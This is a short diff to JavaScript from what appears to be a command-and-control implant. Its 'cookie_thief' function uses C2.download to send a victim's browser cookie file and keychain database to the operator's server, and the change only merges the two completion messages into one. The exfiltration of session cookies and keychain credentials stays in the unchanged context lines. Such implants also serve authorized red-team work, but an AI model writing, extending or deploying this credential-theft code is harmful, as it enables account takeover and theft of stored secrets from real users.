@@ -36,9 +36,6 @@ exports.cookie_thief = function(task, command, params){
 
     try{
         cookieDL_status = C2.download(task, cookieDLPath);
-    	  if(cookieDL_status.hasOwnProperty("file_id")){
-    	      cookieDL_status['user_output'] = "Finished Downloading Cookies";
-        }
     }
     catch(error)  {
         return {'user_output': error.toString(), "completed": true, "status": "error"};
@@ -48,7 +45,7 @@ exports.cookie_thief = function(task, command, params){
     try{
         keyDL_status = C2.download(task, keypath);
     	  if(keyDL_status.hasOwnProperty("file_id")){
-    	      keyDL_status['user_output'] = "Finished Downloading KeychainDB";
+    	      keyDL_status['user_output'] = "Finished Downloading KeychainDB and Cookies";
         }
     }
     catch(error)  {
